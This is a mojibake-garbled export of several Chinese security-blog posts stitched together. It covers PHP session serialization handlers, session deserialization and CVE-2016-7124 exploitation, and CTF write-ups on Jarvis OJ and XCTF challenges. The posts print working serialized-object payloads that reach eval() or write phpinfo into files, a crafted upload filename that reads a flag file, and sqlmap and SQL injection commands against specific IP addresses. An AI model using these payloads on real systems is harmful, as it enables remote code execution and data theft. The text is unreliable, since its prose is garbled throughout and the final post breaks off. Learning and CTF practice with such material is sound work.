PHP sessionå·¥ä½œæµç¨‹ ä»¥PHPä¸ºä¾‹ï¼Œç†è§£sessionçš„åŸç† 1. PHPè„šæœ¬ä½¿ç”¨ session_start()æ—¶å¼€å¯`session`ä¼šè¯ï¼Œä¼šè‡ªåŠ¨æ£€æµ‹`PHPSESSID` - å¦‚æœ`Cookie`ä¸­å­˜åœ¨ï¼Œè·å–`PHPSESSID` - å¦‚æœ`Cookie`ä¸­ä¸å­˜åœ¨ï¼Œåˆ›å»ºä¸€ä¸ª`PHPSESSID`ï¼Œå¹¶é€šè¿‡å“åº”å¤´ä»¥`Cookie`å½¢å¼ä¿å­˜åˆ°æµè§ˆå™¨ 2. åˆå§‹åŒ–è¶…å…¨å±€å˜é‡`$_SESSION`ä¸ºä¸€ä¸ªç©ºæ•°ç»„ 3. PHPé€šè¿‡`PHPSESSID`å»æŒ‡å®šä½ç½®ï¼ˆ`PHPSESSID`æ–‡ä»¶å­˜å‚¨ä½ç½®ï¼‰åŒ¹é…å¯¹åº”çš„æ–‡ä»¶ - å­˜åœ¨è¯¥æ–‡ä»¶ï¼šè¯»å–æ–‡ä»¶å†…å®¹ï¼ˆé€šè¿‡ååºåˆ—åŒ–æ–¹å¼ï¼‰ï¼Œå°†æ•°æ®å­˜å‚¨åˆ°`$_SESSION`ä¸­ - ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼š session_start()åˆ›å»ºä¸€ä¸ª`PHPSESSID`å‘½åæ–‡ä»¶ 4. ç¨‹åºæ‰§è¡Œç»“æŸï¼Œå°†`$_SESSION`ä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°`PHPSESSID`å¯¹åº”çš„æ–‡ä»¶ä¸­ å…·ä½“åŸç†å›¾ï¼š 12.5 php.iniä¸­ä¸€äº›sessioné…ç½® session.save_handler=â€œâ€ â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼) session.auto_start boolen\tâ€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨ session.save_path=\"/tmp\" --è®¾ç½®sessionæ–‡ä»¶çš„å­˜å‚¨ä½ç½® session.auto_start= 0 --æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œä¸å¯åŠ¨ session.serialize_handler= php --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨php session.upload_progress.enabled= On --å¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡ï¼Œé»˜è®¤å¯ç”¨ session.upload_progress.cleanup= On --è¯»å–æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¯ç”¨ 12.6 ä¸åŒçš„å¼•æ“æ¥å¤„ç†sessionæ–‡ä»¶ 1. phpå¤„ç†å™¨ é¦–å…ˆæ¥çœ‹çœ‹é»˜è®¤session.serialize_handler = phpæ—¶å€™çš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹ &lt;?php error_reporting(0); ini_set('session.serialize_handler','php'); session_start(); $_SESSION['session'] = $_GET['session']; ?&gt; phpå¤„ç†å™¨å­˜å‚¨æ ¼å¼ é”®å ç«–çº¿ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ $_SESSION[â€˜nameâ€™]çš„é”®åï¼šname | s:7:â€œxianzhiâ€; 2. php_binaryå¤„ç†å™¨ ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³session.serialize_handler = php_binary &lt;?php error_reporting(0); ini_set('session.serialize_handler','php_binary'); session_start(); $_SESSION['sessionsessionsessionsessionsession'] = $_GET['session']; ?&gt; ä¸ºäº†æ›´èƒ½ç›´è§‚çš„ä½“ç°å‡ºæ ¼å¼çš„å·®åˆ«ï¼Œå› æ­¤è¿™é‡Œè®¾ç½®äº†é”®å€¼é•¿åº¦ä¸º 35ï¼Œ35 å¯¹åº”çš„ ASCII ç ä¸º#ï¼Œæ‰€ä»¥æœ€ç»ˆçš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ é”®å ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼. $ sessionsessionsessionsessionsession s:7:â€œxianzhiâ€; 3. php_serialize å¤„ç†å™¨ ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³session.serialize_handler = php_serialize &lt;?php error_reporting(0); ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['session'] = $_GET['session']; ?&gt; åºåˆ—åŒ–çš„ç»“æœä¸ºï¼ša:1:{s:7:\"session\";s:7:\"xianzhi\";} a:1è¡¨ç¤º$_SESSIONæ•°ç»„ä¸­æœ‰ 1 ä¸ªå…ƒç´ ï¼ŒèŠ±æ‹¬å·é‡Œé¢çš„å†…å®¹å³ä¸ºä¼ å…¥ GET å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼ 4. sessionçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ sessionçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå°±æ˜¯åˆ©ç”¨phpå¤„ç†å™¨å’Œphp_serializeå¤„ç†å™¨çš„å­˜å‚¨æ ¼å¼å·®å¼‚è€Œäº§ç”Ÿï¼Œé€šè¿‡å…·ä½“çš„ä»£ç æˆ‘ä»¬æ¥çœ‹ä¸‹æ¼æ´å‡ºç°çš„åŸå›  phpå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯é”®å|serialized_stringï¼Œè€Œphp_serializeå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯serialized_stringã€‚å¦‚æœç¨‹åºä½¿ç”¨ä¸¤ä¸ªå¼•æ“æ¥åˆ†åˆ«å¤„ç†çš„è¯å°±ä¼šå‡ºç°é—®é¢˜ &lt;?php session_start(); $_SESSION['aaa'] = 'bbb'; //aaa|s:3:\"bbb\"; //è¯¥å¼•æ“ä½¿ç”¨çš„æ˜¯phpï¼Œä¼šæŠŠ'|'çœ‹åšé”®åä¸å€¼çš„åˆ†å‰²ç¬¦ï¼Œä»è€Œé€ æˆäº†æ­§ä¹‰ï¼Œå¯¼è‡´å…¶åœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹'|'åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚ &lt;?php ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['aaa'] = 'bbb'; //a:1:{s:3:\"aaa\";s:3:\"bbb\";} //php_serializeå¼•æ“åªä¼šæŠŠ'|'å½“åšä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚ å…·ä½“ç¤ºä¾‹åˆ†æï¼š é¦–å…ˆåˆ›å»ºsession.phpï¼Œä½¿ç”¨php_serializeå¤„ç†å™¨æ¥å­˜å‚¨sessionæ•°æ® &lt;?php ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['session'] = $_GET['session']; echo $_SESSION['session']; ?&gt; test.phpï¼Œä½¿ç”¨é»˜è®¤phpå¤„ç†å™¨æ¥å­˜å‚¨sessionæ•°æ® &lt;?php session_start(); class f4ke{ public $name; function __wakeup(){ echo \"Who are you?\"; } function __destruct(){ eval($this-&gt;name); } } $str = new f4ke(); ?&gt; æ¥ç€ï¼Œæˆ‘ä»¬æ„å»ºURLè¿›è¡Œè®¿é—®session.phpï¼š http://www.session-serialize.com/session.php?session=|O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";} æ‰“å¼€PHPSESSIDæ–‡ä»¶å¯çœ‹åˆ°åºåˆ—åŒ–å­˜å‚¨çš„å†…å®¹ a:1:{s:7:\"session\";s:45:\"|O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";} æ¼æ´åˆ†æï¼š åœ¨session.phpç¨‹åºæ‰§è¡Œï¼Œæˆ‘ä»¬å°†|O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";}é€šè¿‡php_serializeå¤„ç†å™¨åºåˆ—åŒ–ä¿å­˜æˆPHPSESSIDæ–‡ä»¶ï¼› ç”±äºæµè§ˆå™¨ä¸­ä¿å­˜çš„PHPSESSIDæ–‡ä»¶åä¸å˜ï¼Œå½“æˆ‘ä»¬è®¿é—®test.phpï¼Œsession_start();æ‰¾åˆ°PHPSESSIDæ–‡ä»¶å¹¶ä½¿ç”¨phpå¤„ç†å™¨ååºåˆ—åŒ–æ–‡ä»¶å†…å®¹ï¼Œè¯†åˆ«æ ¼å¼å³ é”®å ç«–çº¿ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ a:1:{s:7:â€œsessionâ€;s:45:\" | O:4:â€œf4keâ€:1:{s:4:â€œnameâ€;s:10:â€œphpinfo();â€;} phpå¤„ç†å™¨ä¼šä»¥|ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå°†O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";}ååºåˆ—åŒ–ï¼Œå°±ä¼šè§¦å‘__wakeup()æ–¹æ³•ï¼Œæœ€åå¯¹è±¡é”€æ¯æ‰§è¡Œ__destruct()æ–¹æ³•ä¸­çš„eval()å‡½æ•°ï¼Œç›¸å½“äºæ‰§è¡Œå¦‚ä¸‹ï¼š $_SESSION['session'] = new f4ke(); $_SESSION['session']-&gt;name = 'phpinfo();'; æˆ‘ä»¬è®¿é—®test.phpï¼Œå³å¯ç›´æ¥æ‰§è¡Œphpinfo()å‡½æ•° CTFä¾‹é¢˜ï¼šPHPINFO æ‰¾ä¸åˆ°åŸé¢˜ï¼Œå…ˆè·Ÿç€åšä¸€é &lt;?php //A webshell is wait for you ini_set('session.serialize_handler', 'php'); session_start(); class OowoO { public $mdzz; function __construct() { $this-&gt;mdzz = 'phpinfo();'; } function __destruct() { eval($this-&gt;mdzz); } } if(isset($_GET['phpinfo'])) { $m = new OowoO(); } else { highlight_string(file_get_contents('index.php')); } ?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ini_set('session.serialize_handler', 'php')ï¼Œåˆ¤æ–­å¯èƒ½å­˜åœ¨sessionååºåˆ—åŒ–æ¼æ´ï¼Œæ ¹æ®ä»£ç é€»è¾‘ï¼Œè®¿é—®URLåŠ ä¸Šphpinfoå‚æ•°æ–°å»ºå¯¹è±¡è§¦å‘é­”æœ¯æ–¹æ³•æ‰§è¡Œphpinfo()å‡½æ•°ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹session.serialize_handleré…ç½® å¯è§php.iniä¸­session.serialize_handler = php_serializeï¼Œå½“å‰ç›®å½•ä¸­è¢«è®¾ç½®ä¸ºsession.serialize_handler = phpï¼Œå› æ­¤å­˜åœ¨sessionååºåˆ—åŒ–åˆ©ç”¨çš„æ¡ä»¶ è¡¥å……çŸ¥è¯† phpinfoæ–‡ä»¶ä¸­ local value(å±€éƒ¨å˜é‡ï¼šä½œç”¨äºå½“å‰ç›®å½•ç¨‹åºï¼Œä¼šè¦†ç›–master valueå†…å®¹):php master value(ä¸»å˜é‡ï¼šphp.inié‡Œé¢çš„å†…å®¹):php_serialize é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ‰¾åˆ°ä»£ç å…¥å£å°†åˆ©ç”¨ä»£ç å†™å…¥åˆ°sessionæ–‡ä»¶ï¼Ÿæƒ³è¦å†™å…¥sessionæ–‡ä»¶å°±å¾—æƒ³åŠæ³•åœ¨$_SESSIONå˜é‡ä¸­å¢åŠ æˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ è¡¥å……çŸ¥è¯† Session ä¸Šä¼ è¿›åº¦(æ­¤ç‰¹æ€§è‡ª PHP 5.4.0 åå¯ç”¨) å½“ session.upload_progress.enabledINI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefixä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ ç¿»è¯‘æˆäººè¯å°±æ˜¯ï¼Œå½“æ£€æµ‹Session ä¸Šä¼ è¿›åº¦è¿™ä¸€ç‰¹æ€§æ˜¯å¼€å¯çŠ¶æ€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å®¢æˆ·ç«¯å†™ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæ–‡ä»¶ä¸Šä¼ çš„åŒæ—¶ï¼ŒPOSTä¸€ä¸ªä¸php.iniä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡PHP_SESSION_UPLOAD_PROGRESSï¼Œå¦‚ä¸‹å›¾ï¼Œå³å¯å†™å…¥$_SESSIONï¼Œè¿›ä¸€æ­¥åºåˆ—åŒ–å†™å…¥sessionæ–‡ä»¶ ä¸‹é¢æ˜¯å®˜æ–¹ç»™å‡ºçš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹è¿›åº¦ä¾‹å­: &lt;form action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"&lt;?php echo ini_get(\"session.upload_progress.name\"); ?&gt;\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; å…¶ä¸­name=\"\"ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºname=\"PHP_SESSION_UPLOAD_PROGRESS\" åœ¨sessionä¸­å­˜å‚¨çš„ä¸Šä¼ è¿›åº¦ï¼Œå¦‚ä¸‹æ‰€ç¤º: &lt;?php $_SESSION[\"upload_progress_123\"] = array( \"start_time\" =&gt; 1234567890, // The request time è¯·æ±‚æ—¶é—´ \"content_length\" =&gt; 57343257, // POST content length é•¿åº¦ \"bytes_processed\" =&gt; 453489, // Amount of bytes received and processed å·²æ¥æ”¶å­—èŠ‚ \"done\" =&gt; false, // true when the POST handler has finished, successfully or not æ˜¯å¦ä¸Šä¼ å®Œæˆ \"files\" =&gt; array(//ä¸Šä¼ çš„æ–‡ä»¶ 0 =&gt; array( \"field_name\" =&gt; \"file1\", // Name of the &lt;input/&gt; field inputä¸­è®¾å®šçš„å˜é‡å // The following 3 elements equals those in $_FILES \"name\" =&gt; \"foo.avi\", //æ–‡ä»¶å \"tmp_name\" =&gt; \"/tmp/phpxxxxxx\", \"error\" =&gt; 0, \"done\" =&gt; true, // True when the POST handler has finished handling this file \"start_time\" =&gt; 1234567890, // When this file has started to be processed \"bytes_processed\" =&gt; 57343250, // Amount of bytes received and processed for this file ), // An other file, not finished uploading, in the same request 1 =&gt; array( \"field_name\" =&gt; \"file2\", \"name\" =&gt; \"bar.avi\", \"tmp_name\" =&gt; NULL, \"error\" =&gt; 0, \"done\" =&gt; false, \"start_time\" =&gt; 1234567899, \"bytes_processed\" =&gt; 54554, ), ) ); å…¶ä¸­ï¼Œsessionä¸­çš„field_nameå’Œnameéƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ï¼ ä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹è§£é¢˜æ‹¿åˆ°flag é¦–å…ˆï¼Œhttp://web.jarvisoj.com:32784/index.php?phpinfoæŸ¥è¯¢è®¾ç½® session.upload_progress.enabled = On --è¡¨æ˜å…è®¸ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡ session.upload_progress.cleanup = Off --è¡¨æ˜æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åï¼Œä¸æ¸…ç†è¿›åº¦ä¿¡æ¯($ _SESSIONå˜é‡) å³å…è®¸ä¸Šä¼ è¿›åº¦è·Ÿè¸ªä¸”ç»“æŸåä¸æ¸…é™¤æ•°æ®ï¼Œæ›´æœ‰åˆ©ä½¿ç”¨session.upload_progress.nameæ¥å°†åˆ©ç”¨ä»£ç å†™å…¥sessionæ–‡ä»¶ æ„é€ POSTè¡¨å•æäº¤ä¸Šä¼ æ–‡ä»¶ &lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ä½œä¸ºpayloadï¼ˆåˆ©ç”¨ä»£ç ï¼‰ &lt;?php class OowoO { public $mdzz='print_r(scandir(dirname(__FILE__)));'; } $obj = new OowoO(); echo serialize($obj); ?&gt; //O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";} ä¸ºäº†é˜²æ­¢\"è¢«è½¬ä¹‰ï¼Œæˆ‘ä»¬åœ¨payloadä¸­åŠ å…¥\\ éšæ„é€‰æ‹©æ–‡ä»¶ï¼Œç‚¹å‡»è¡¨å•æäº¤ï¼Œä½¿ç”¨æŠ“åŒ…å·¥å…·burpsuiteæŠ“å–è¯·æ±‚åŒ… å¹¶ä¿®æ”¹filenameå€¼ä¸º |O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";} å‘é€è¯·æ±‚åŒ…ï¼Œä»£ç æ‰§è¡Œè¿‡ç¨‹åˆ†æï¼š å› æ­¤ç›´æ¥æ‰§è¡Œprint_r(scandir(dirname(__FILE__)));å¹¶è¿”å› phpinfo`æŸ¥çœ‹å½“å‰ç›®å½•ï¼Œ`/opt/lampp/htdocs/ æ„é€ æœ€ç»ˆpayloadè¯»å–Here_1s_7he_fl4g_buT_You_Cannot_see.phpæ–‡ä»¶å†…å®¹ï¼Œå³flag |O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:88:\\\"print_r(file_get_contents(\\\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\"));\\\";} è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥è®¿é—®ä¸äº†è¿æ¥ï¼Œæ‰¾åˆ°äº†åŸé¶åœºä¹Ÿä¸è¡Œâ€¦ ctfshow web263 session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€ https://www.freebuf.com/vuls/202819.ht 12.7 CVE-2016-7124 æ¼æ´åˆ†æ è¯¥æ¼æ´å­˜åœ¨äºPHP5å°äº5.6.25ç‰ˆæœ¬æˆ–PHP7å°äº7.0.10ç‰ˆæœ¬ä¸­ï¼Œè¯¥æ¼æ´ç®€å•æ¥è¯´å°±æ˜¯å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œï¼Œdemoå¦‚ä¸‹ &lt;html&gt; &lt;head&gt; &lt;title&gt;PHPååºåˆ—åŒ–demo&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;?php class test{ var $name = \"Jacky\"; function __destruct(){ $file = fopen(\"hello.php\",\"w\"); fputs($file,$this-&gt;name); fclose($file); } function __wakeup() { foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo \"Waking up... \"; } } $test = $_POST['test']; $test_unser = unserialize($test); ?&gt; &lt;/body&gt; &lt;/html&gt; ç”±äº__wakeup()çš„æ‰§è¡Œé¡ºåºåœ¨__destruct()ä¹‹å‰ï¼Œæ‰€ä»¥__wakeup()ä¼šå°†å¯¹è±¡å†…çš„æ‰€æœ‰å±æ€§è®¾ä¸ºNULLï¼Œåœ¨__destruct()æ‰§è¡Œæ—¶ï¼Œæ²¡æœ‰å†…å®¹ä¼šå†™åˆ°æ–‡ä»¶ä¸­ã€‚ä½†ä½¿ç”¨æ¼æ´ï¼Œå¯ä»¥è·³è¿‡__wakeup()ï¼Œç›´æ¥æ‰§è¡Œ__destruct()ï¼Œè¿™æ ·å¯ä»¥å°†å±æ€§å†…å®¹å†™å…¥æ–‡ä»¶ä¸­ã€‚ å¦‚æœæˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹payload test=O:4:\"test\":1:{s:4:\"name\";s:18:\"&lt;?php phpinfo();?&gt;\";} ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°ï¼Œé¡µé¢ä¸Šä¼šå‡ºç°å¦‚ä¸‹è¾“å‡º å¦‚æœæˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹payload test=O:4:\"test\":2:{s:4:\"name\";s:18:\"&lt;?php phpinfo();?&gt;\";} ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°ï¼Œé¡µé¢ä¸Šä¼šå‡ºç°å¦‚ä¸‹è¾“å‡º è¿™é‡Œå‘ç°ä¸ªæœ‰è¶£çš„äº‹æƒ…,echo ä¸èƒ½æ‰“å°å‡ºPHPæ ‡è¯†ç¬¦&lt;?php,å› æ­¤è¦urlç¼–ç ä¸€ä¸‹ GPTå›ç­”: åœ¨PHPä¸­ï¼Œ&lt;?php æ˜¯ä¸€ä¸ªæ ‡è®°ï¼ˆtagï¼‰ï¼Œç”¨äºæŒ‡ç¤º PHP ä»£ç çš„èµ·å§‹ç‚¹ã€‚å½“ä½¿ç”¨ echo å‡½æ•°æ—¶ï¼Œå®ƒä¼šå°†å…¶åçš„å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿›è¡Œè¾“å‡ºã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ å°è¯•ä½¿ç”¨ echo è¾“å‡º &lt;?phpï¼Œå®ƒå°†è¢«è§£é‡Šä¸ºä¸€ä¸ª PHP çš„èµ·å§‹æ ‡è®°ï¼Œè€Œä¸æ˜¯æ™®é€šçš„å­—ç¬¦ä¸²ã€‚ ä¸ºäº†åœ¨ echo ä¸­è¾“å‡º &lt;?php è¿™æ ·çš„ PHP æ ‡è¯†ç¬¦ï¼Œä½ å¯ä»¥ä½¿ç”¨è½¬ä¹‰å­—ç¬¦ \\ æ¥å‘Šè¯‰ PHP è§£é‡Šå™¨ä¸è¦å°†å…¶è§£é‡Šä¸ºæ ‡è®°ï¼Œè€Œæ˜¯ä½œä¸ºæ™®é€šçš„æ–‡æœ¬ã€‚ 1.ä½¿ç”¨htmlspecialcharså‡½æ•°å¯¹å­—ç¬¦ä¸²è¿›è¡Œè½¬ä¹‰ï¼š echo htmlspecialchars('&lt;?php'); 2.å°†&lt;?phpæ‹†åˆ†ä¸ºä¸¤éƒ¨åˆ†å¹¶è¿æ¥èµ·æ¥ï¼š echo '&lt;?' . 'php'; é˜²å¾¡æ–¹æ³•ï¼š 1.ä¸¥æ ¼çš„æŠŠæ§ unserailize() å‡½æ•°çš„å‚æ•°ï¼Œä¸è¦ç»™æ”»å‡»è€…ä»»ä½•è¾“å…¥çš„å¯èƒ½ 2.åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œå¯¹å‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚ 3.ä¸¥æ ¼æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œä¸æ˜¯åªæ£€æŸ¥æ–‡ä»¶å¤´ã€‚ 4.åœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ç¦ç”¨å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€ä»£ç çš„å±é™©å‡½æ•°ã€‚ PHPæ‰‹å†Œï¼šhttps://www.php.net/manual/en/book.stream.php","categories":["å¸¸è§topæ¼æ´"]},{"title":"æ”»é˜²ä¸–ç•Œ-inget","path":"/2023/07/27/inget/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š æ ¹æ®é¢˜ç›®åç§°ï¼Œå¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªgetå‹sqlæ³¨å…¥ å°è¯•æ‰‹å·¥æ³¨å…¥ bpæŠ“åŒ…ï¼Œå…ˆå°è¯•å¦‚ä¸‹ ?id=1' and 1=1-- - ?id=1' and 1=2-- - ?id=1' or 1=2-- - éƒ½å‡æ— å›æ˜¾ å°è¯•ï¼š?id=1' or 1=1-- - æˆåŠŸå›æ˜¾ å°è¯•sqlmapæ³¨å…¥ ç¬¬ä¸€æ­¥ï¼šsqlmap -u â€œhttp://61.147.171.105:55796/?id=1â€ -dbs å‘ç°å¦‚å›¾æ‰€ç¤ºçš„æ•æ„Ÿæ•°æ®åº“åcyber æŸ¥çœ‹cyberè¡¨ä¸­æ•°æ® ç¬¬äºŒæ­¥ï¼šsqlmap -u \"http://61.147.171.105:55796/?id=1\" -T cyber --dump å‘ç°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-baby_web","path":"/2023/07/27/baby-web/","content":"é¢˜ç›®æè¿°ï¼š æƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¦–é¡µå‘ç°å¦‚å›¾ é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬æƒ³æƒ³åˆå§‹é¡µé¢åœ¨å“ªï¼Œé‚£å¾ˆæ˜æ˜¾å°±æ˜¯è®©æˆ‘ä»¬è®¿é—®index.phpï¼Œäºæ˜¯æˆ‘ä»¬è®¿é—®index.phpçœ‹çœ‹ï¼Œè®¿é—®ä¹‹åå‘ç°å…¶å¾ˆå¿«å°±è·³è½¬åˆ°1.phpï¼Œæ‰€ä»¥æˆ‘ä»¬F12çœ‹çœ‹ç½‘ç»œæƒ…å†µï¼Œå¦‚ä¸‹å›¾ï¼Œæ‰“å¼€åç»§ç»­è®¿é—®index.phpå‘ç°å¦‚ä¸‹å›¾ï¼Œç»“æœæ˜¯è¢«é‡å®šå‘äº† é‚£æˆ‘ä»¬bpæŠ“åŒ…çœ‹çœ‹ï¼Œè®¿é—®index.phpæŠ“åŒ… æˆåŠŸæˆªå–åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-simple_php","path":"/2023/07/27/simple-php/","content":"é¢˜ç›®æè¿°ï¼š å°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚ é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€é¡µé¢åï¼Œå‘ç°ç®€å•çš„PHPä»£ç ï¼Œå¼€å§‹å®¡è®¡ &lt;?php show_source(__FILE__); include(\"config.php\"); $a=@$_GET['a']; $b=@$_GET['b']; if($a==0 and $a){ echo $flag1; } if(is_numeric($b)){ exit(); } if($b&gt;1234){ echo $flag2; } ?&gt; å¦‚ä¸Šä»£ç 